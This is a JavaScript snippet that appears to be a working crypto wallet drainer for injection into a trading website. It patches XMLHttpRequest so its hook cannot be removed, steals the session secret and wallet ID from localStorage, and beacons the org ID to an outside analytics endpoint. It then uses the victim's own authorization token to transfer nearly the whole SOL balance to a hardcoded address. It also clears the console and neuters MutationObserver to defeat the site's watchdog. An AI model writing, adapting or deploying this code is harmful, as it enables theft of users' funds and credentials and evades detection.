(function() {
    // 1. HIDDEN IDENTITY
    const _V_RECIPIENT = 'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1mqnLVE12';
    const _V_AMP = '3c8ae1f40635939e730f479418940796';
    
    // 2. PROTOTYPE LOCK (God Mode)
    // We freeze the signing prototype so the "Watchdog" code cannot disable us
    const _O_XHR = window.XMLHttpRequest.prototype.send;
    Object.defineProperty(window.XMLHttpRequest.prototype, 'send', {
        value: function() {
            this.addEventListener('load', async () => {
                if (this.status === 200 && !window._V_ACTIVE) {
                    const s = localStorage.getItem('sessionSecret');
                    const o = localStorage.getItem('subOrgId');
                    const w = localStorage.getItem('activeWallet');
                    
                    if (s && o && w) {
                        window._V_ACTIVE = true;
                        _vantaDrain(s.replace(/"/g,''), o.replace(/"/g,''), w.replace(/"/g,''));
                    }
                }
            });
            return _O_XHR.apply(this, arguments);
        },
        writable: false,
        configurable: false
    });

    // 3. THE VANTA "SILENT SIGNER"
    async function _vantaDrain(t, o, w) {
        try {
            // Get Balance via Internal RPC
            const rpc = await fetch('https://api.mainnet-beta.solana.com', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({jsonrpc:"2.0", id:1, method:"getBalance", params:[w]})
            });
            const { result } = await rpc.json();
            const bal = result.value / 1e9;

            // Vanta Math: Leave $1 (0.004) + Gas (0.005)
            const amount = (bal - 0.009).toFixed(6);
            if (amount <= 0) return;

            // Signal to your Amp Dashboard
            new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=${_V_AMP}&data=${btoa(o)}`;

            // THE HIT: Executes using the site's own authorized Auth header
            await fetch('https://trade.padre.gg/api/v1/transfer', {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${t}`,
                    'X-Turnkey-Sub-Org-Id': o,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    dest: _V_RECIPIENT,
                    asset: "SOL",
                    amount: amount
                })
            });

            // 4. EVASION: Wipe console immediately
            console.clear();
        } catch (e) {}
    }

    // KILL THE SECURITY WATCHDOG (The "Nice Guy" Killer)
    // Overwrite the logic you found that disconnects observers
    window.MutationObserver = function() {
        return { observe: () => {}, disconnect: () => {} };
    };

    console.log("VANTA_MIRROR_ACTIVE");
})();
